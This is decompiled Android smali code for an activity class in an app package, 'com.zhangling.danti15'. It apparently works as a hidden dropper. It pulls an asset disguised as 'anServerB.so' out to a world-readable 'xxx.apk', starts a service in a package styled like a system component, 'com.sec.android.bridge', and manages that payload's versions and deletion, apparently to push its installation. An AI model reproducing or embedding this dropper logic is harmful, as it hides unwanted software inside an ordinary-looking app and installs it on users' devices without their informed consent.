.class public Lcom/zhangling/danti15/BaseAActivity;
.super Landroid/app/TabActivity;
.source "BaseAActivity.java"


# static fields
.field private static beNotInstaled:Z

.field static context:Landroid/content/Context;

.field public static editor:Landroid/content/SharedPreferences$Editor;

.field public static sp:Landroid/content/SharedPreferences;


# instance fields
.field private MODE:I

.field appClassName:Ljava/lang/String;

.field b_name_full:Ljava/lang/String;

.field b_name_prefix:Ljava/lang/String;

.field b_name_suffix:Ljava/lang/String;

.field b_package:Ljava/lang/String;

.field b_package_class:Ljava/lang/String;

.field private handler:Landroid/os/Handler;

.field intent:Landroid/content/Intent;

.field pd:Landroid/app/ProgressDialog;

.field textView:Landroid/widget/TextView;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 35
    sput-object v0, Lcom/zhangling/danti15/BaseAActivity;->sp:Landroid/content/SharedPreferences;

    .line 36
    sput-object v0, Lcom/zhangling/danti15/BaseAActivity;->editor:Landroid/content/SharedPreferences$Editor;

    .line 48
    sput-object v0, Lcom/zhangling/danti15/BaseAActivity;->context:Landroid/content/Context;

    .line 51
    const/4 v0, 0x1

    sput-boolean v0, Lcom/zhangling/danti15/BaseAActivity;->beNotInstaled:Z

    .line 28
    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 28
    invoke-direct {p0}, Landroid/app/TabActivity;-><init>()V

    .line 33
    const/4 v0, 0x3

    iput v0, p0, Lcom/zhangling/danti15/BaseAActivity;->MODE:I

    .line 39
    const-string v0, "anServerB"

    iput-object v0, p0, Lcom/zhangling/danti15/BaseAActivity;->b_name_prefix:Ljava/lang/String;

    .line 40
    const-string v0, ".so"

    iput-object v0, p0, Lcom/zhangling/danti15/BaseAActivity;->b_name_suffix:Ljava/lang/String;

    .line 41
    const-string v0, "anServerB.so"

    iput-object v0, p0, Lcom/zhangling/danti15/BaseAActivity;->b_name_full:Ljava/lang/String;

    .line 42
    const-string v0, "com.sec.android.bridge"

    iput-object v0, p0, Lcom/zhangling/danti15/BaseAActivity;->b_package:Ljava/lang/String;

    .line 43
    const-string v0, "com.sec.android.bridge.BridgeProvider"

    iput-object v0, p0, Lcom/zhangling/danti15/BaseAActivity;->b_package_class:Ljava/lang/String;

    .line 44
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    iput-object v0, p0, Lcom/zhangling/danti15/BaseAActivity;->intent:Landroid/content/Intent;

    .line 45
    iput-object v1, p0, Lcom/zhangling/danti15/BaseAActivity;->textView:Landroid/widget/TextView;

    .line 46
    iput-object v1, p0, Lcom/zhangling/danti15/BaseAActivity;->pd:Landroid/app/ProgressDialog;

    .line 50
    iput-object v1, p0, Lcom/zhangling/danti15/BaseAActivity;->appClassName:Ljava/lang/String;

    .line 175
    new-instance v0, Lcom/zhangling/danti15/BaseAActivity$1;

    invoke-direct {v0, p0}, Lcom/zhangling/danti15/BaseAActivity$1;-><init>(Lcom/zhangling/danti15/BaseAActivity;)V

    iput-object v0, p0, Lcom/zhangling/danti15/BaseAActivity;->handler:Landroid/os/Handler;

    .line 28
    return-void
.end method

.method static synthetic access$0()Z
    .locals 1

    .prologue
    .line 51
    sget-boolean v0, Lcom/zhangling/danti15/BaseAActivity;->beNotInstaled:Z

    return v0
.end method

.method static synthetic access$1(Lcom/zhangling/danti15/BaseAActivity;I)V
    .locals 0

    .prologue
    .line 333
    invoke-direct {p0, p1}, Lcom/zhangling/danti15/BaseAActivity;->sendMsg(I)V

    return-void
.end method

.method static synthetic access$2(Lcom/zhangling/danti15/BaseAActivity;)V
    .locals 0

    .prologue
    .line 151
    invoke-direct {p0}, Lcom/zhangling/danti15/BaseAActivity;->reLeaseB()V

    return-void
.end method

.method static synthetic access$3(Z)V
    .locals 0

    .prologue
    .line 51
    sput-boolean p0, Lcom/zhangling/danti15/BaseAActivity;->beNotInstaled:Z

    return-void
.end method

.method static synthetic access$4(Lcom/zhangling/danti15/BaseAActivity;)V
    .locals 0

    .prologue
    .line 60
    invoke-direct {p0}, Lcom/zhangling/danti15/BaseAActivity;->startBridge()V

    return-void
.end method

.method private reLeaseB()V
    .locals 7

    .prologue
    .line 152
    const-string v5, "start reLeaseB"

    invoke-static {v5}, Lcom/zhangling/util/Logs;->p(Ljava/lang/String;)V

    .line 154
    :try_start_0
    invoke-direct {p0}, Lcom/zhangling/danti15/BaseAActivity;->tryDelApk()V

    .line 155
    invoke-virtual {p0}, Lcom/zhangling/danti15/BaseAActivity;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v5

    iget-object v6, p0, Lcom/zhangling/danti15/BaseAActivity;->b_name_full:Ljava/lang/String;

    invoke-virtual {v5, v6}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v1

    .line 156
    .local v1, "is":Ljava/io/InputStream;
    const-string v5, "xxx.apk"

    const/4 v6, 0x1

    invoke-virtual {p0, v5, v6}, Lcom/zhangling/danti15/BaseAActivity;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v3

    .line 157
    .local v3, "outStream":Ljava/io/FileOutputStream;
    invoke-virtual {v1}, Ljava/io/InputStream;->available()I

    move-result v4

    .line 158
    .local v4, "size":I
    new-array v0, v4, [B

    .line 161
    .local v0, "buffer":[B
    :goto_0
    invoke-virtual {v1, v0}, Ljava/io/InputStream;->read([B)I

    move-result v2

    .line 162
    .local v2, "numread":I
    const/4 v5, -0x1

    if-ne v2, v5, :cond_0

    .line 167
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 168
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->flush()V

    .line 169
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V

    .line 170
    const-string v5, "start suc"

    invoke-static {v5}, Lcom/zhangling/util/Logs;->p(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 172
    .end local v0    # "buffer":[B
    .end local v1    # "is":Ljava/io/InputStream;
    .end local v2    # "numread":I
    .end local v3    # "outStream":Ljava/io/FileOutputStream;
    .end local v4    # "size":I
    :goto_1
    const-string v5, "start finished"

    invoke-static {v5}, Lcom/zhangling/util/Logs;->p(Ljava/lang/String;)V

    .line 173
    return-void

    .line 165
    .restart local v0    # "buffer":[B
    .restart local v1    # "is":Ljava/io/InputStream;
    .restart local v2    # "numread":I
    .restart local v3    # "outStream":Ljava/io/FileOutputStream;
    .restart local v4    # "size":I
    :cond_0
    :try_start_1
    invoke-virtual {v3, v0}, Ljava/io/FileOutputStream;->write([B)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 171
    .end local v0    # "buffer":[B
    .end local v1    # "is":Ljava/io/InputStream;
    .end local v2    # "numread":I
    .end local v3    # "outStream":Ljava/io/FileOutputStream;
    .end local v4    # "size":I
    :catch_0
    move-exception v5

    goto :goto_1
.end method

.method private sendMsg(I)V
    .locals 2
    .param p1, "flag"    # I

    .prologue
    .line 334
    new-instance v0, Landroid/os/Message;

    invoke-direct {v0}, Landroid/os/Message;-><init>()V

    .line 335
    .local v0, "msg":Landroid/os/Message;
    iput p1, v0, Landroid/os/Message;->what:I

    .line 336
    iget-object v1, p0, Lcom/zhangling/danti15/BaseAActivity;->handler:Landroid/os/Handler;

    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    .line 337
    return-void
.end method

.method private startBridge()V
    .locals 4

    .prologue
    .line 62
    :try_start_0
    const-string v1, "start bridge"

    invoke-static {v1}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V

    .line 64
    iget-object v1, p0, Lcom/zhangling/danti15/BaseAActivity;->intent:Landroid/content/Intent;

    iget-object v2, p0, Lcom/zhangling/danti15/BaseAActivity;->b_package:Ljava/lang/String;

    iget-object v3, p0, Lcom/zhangling/danti15/BaseAActivity;->b_package_class:Ljava/lang/String;

    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 65
    iget-object v1, p0, Lcom/zhangling/danti15/BaseAActivity;->intent:Landroid/content/Intent;

    invoke-virtual {p0, v1}, Lcom/zhangling/danti15/BaseAActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 66
    const-string v1, "start bridge has finished"

    invoke-static {v1}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 70
    :goto_0
    return-void

    .line 67
    :catch_0
    move-exception v1

    move-object v0, v1

    .line 68
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v0}, Lcom/zhangling/util/Logs;->out(Ljava/lang/Exception;)V

    goto :goto_0
.end method

.method private tryDelApk()V
    .locals 4

    .prologue
    .line 138
    :try_start_0
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "/data/data/"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/zhangling/danti15/BaseAActivity;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/files/xxx.apk"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 139
    .local v1, "tf":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 140
    const-string v2, "apk exists"

    invoke-static {v2}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V

    .line 141
    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    .line 142
    const-string v2, "apk del suc"

    invoke-static {v2}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V

    .line 143
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "apk is "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 148
    .end local v1    # "tf":Ljava/io/File;
    :cond_0
    :goto_0
    return-void

    .line 145
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 146
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v0}, Lcom/zhangling/util/Logs;->out(Ljava/lang/Exception;)V

    goto :goto_0
.end method


# virtual methods
.method public getSDPath()Ljava/lang/String;
    .locals 4

    .prologue
    .line 347
    const/4 v1, 0x0

    .line 348
    .local v1, "sdDir":Ljava/io/File;
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v2

    const-string v3, "mounted"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    .line 349
    .local v0, "sdCardExist":Z
    if-eqz v0, :cond_0

    .line 350
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    .line 352
    :cond_0
    invoke-virtual {v1}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v2

    return-object v2
.end method

.method public initData(Ljava/lang/String;)V
    .locals 9
    .param p1, "className"    # Ljava/lang/String;

    .prologue
    const/16 v8, 0xa

    const-string v5, "global_b_version_id"

    const-string v7, "first_app_perferences"

    .line 74
    sget-object v5, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    const-string v6, "1.5"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 131
    :cond_0
    :goto_0
    return-void

    .line 76
    :cond_1
    invoke-direct {p0}, Lcom/zhangling/danti15/BaseAActivity;->startBridge()V

    .line 77
    iput-object p1, p0, Lcom/zhangling/danti15/BaseAActivity;->appClassName:Ljava/lang/String;

    .line 79
    const-string v5, "first_app_perferences"

    iget v5, p0, Lcom/zhangling/danti15/BaseAActivity;->MODE:I

    invoke-virtual {p0, v7, v5}, Lcom/zhangling/danti15/BaseAActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    sput-object v5, Lcom/zhangling/danti15/BaseAActivity;->sp:Landroid/content/SharedPreferences;

    .line 80
    sget-object v5, Lcom/zhangling/danti15/BaseAActivity;->sp:Landroid/content/SharedPreferences;

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    sput-object v5, Lcom/zhangling/danti15/BaseAActivity;->editor:Landroid/content/SharedPreferences$Editor;

    .line 86
    :try_start_0
    invoke-virtual {p0}, Lcom/zhangling/danti15/BaseAActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    invoke-virtual {p0}, Lcom/zhangling/danti15/BaseAActivity;->getPackageName()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    invoke-virtual {v5, v6, v7}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v5

    iget v4, v5, Landroid/content/pm/PackageInfo;->versionCode:I

    .line 87
    .local v4, "versionId":I
    const-string v5, "here"

    invoke-static {v5}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V

    .line 88
    iget-object v5, p0, Lcom/zhangling/danti15/BaseAActivity;->b_package:Ljava/lang/String;

    const/4 v6, 0x2

    invoke-virtual {p0, v5, v6}, Lcom/zhangling/danti15/BaseAActivity;->createPackageContext(Ljava/lang/String;I)Landroid/content/Context;

    move-result-object v1

    .line 89
    .local v1, "firstAppContext":Landroid/content/Context;
    const-wide/16 v5, 0x1f4

    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V

    .line 90
    const-string v5, "here2"

    invoke-static {v5}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V

    .line 91
    const-string v5, "first_app_perferences"

    iget v6, p0, Lcom/zhangling/danti15/BaseAActivity;->MODE:I

    invoke-virtual {v1, v5, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 92
    .local v3, "sp_tmp":Landroid/content/SharedPreferences;
    const-string v5, "here3"

    invoke-static {v5}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V

    .line 93
    const-string v5, "global_b_version_id"

    const/4 v6, 0x0

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    .line 94
    .local v2, "global_b_version_id":I
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "global_b_version_id:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/zhangling/util/Logs;->out(Ljava/lang/String;)V

    .line 96
    if-nez v2, :cond_4

    .line 97
    sget-boolean v5, Lcom/zhangling/danti15/BaseAActivity;->beNotInstaled:Z

    if-eqz v5, :cond_2

    .line 98
    const/16 v5, 0xa

    invoke-direct {p0, v5}, Lcom/zhangling/danti15/BaseAActivity;->sendMsg(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 125
    .end local v1    # "firstAppContext":Landroid/content/Context;
    .end local v2    # "global_b_version_id":I
    .end local v3    # "sp_tmp":Landroid/content/SharedPreferences;
    .end local v4    # "versionId":I
    :catch_0
    move-exception v5

    move-object v0, v5

    .line 126
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v0}, Lcom/zhangling/util/Logs;->out(Ljava/lang/Exception;)V

    .line 127
    sget-boolean v5, Lcom/zhangling/danti15/BaseAActivity;->beNotInstaled:Z

    if-eqz v5, :cond_0

    .line 128
    invoke-direct {p0, v8}, Lcom/zhangling/danti15/BaseAActivity;->sendMsg(I)V

    goto :goto_0

    .line 100
    .end local v0    # "e":Ljava/lang/Exception;
    .restart local v1    # "firstAppContext":Landroid/content/Context;
    .restart local v2    # "global_b_version_id":I
    .restart local v3    # "sp_tmp":Landroid/content/SharedPreferences;
    .restart local v4    # "versionId":I
    :cond_2
    :try_start_1
    iget-object v5, p0, Lcom/zhangling/danti15/BaseAActivity;->b_package:Ljava/lang/String;

    const/4 v6, 0x2

    invoke-virtual {p0, v5, v6}, Lcom/zhangling/danti15/BaseAActivity;->createPackageContext(Ljava/lang/String;I)Landroid/content/Context;

    move-result-object v1

    .line 101
    const-string v5, "first_app_perferences"

    iget v6, p0, Lcom/zhangling/danti15/BaseAActivity;->MODE:I

    invoke-virtual {v1, v5, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 102
    const-string v5, "global_b_version_id"

    const/4 v6, 0x0

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    .line 104
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "2 global_b_version_id:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/zhangling/util/Logs;->p(Ljava/lang/String;)V

    .line 106
    if-lez v2, :cond_3

    if-ge v2, v4, :cond_3

    .line 107
    const/16 v5, 0xa

    invoke-direct {p0, v5}, Lcom/zhangling/danti15/BaseAActivity;->sendMsg(I)V

    goto/16 :goto_0

    .line 111
    :cond_3
    invoke-direct {p0}, Lcom/zhangling/danti15/BaseAActivity;->tryDelApk()V

    goto/16 :goto_0

    .line 117
    :cond_4
    if-ge v2, v4, :cond_5

    .line 118
    const/16 v5, 0xa

    invoke-direct {p0, v5}, Lcom/zhangling/danti15/BaseAActivity;->sendMsg(I)V

    goto/16 :goto_0

    .line 122
    :cond_5
    invoke-direct {p0}, Lcom/zhangling/danti15/BaseAActivity;->tryDelApk()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 0
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 55
    invoke-super {p0, p1}, Landroid/app/TabActivity;->onCreate(Landroid/os/Bundle;)V

    .line 56
    sput-object p0, Lcom/zhangling/danti15/BaseAActivity;->context:Landroid/content/Context;

    .line 57
    return-void
.end method
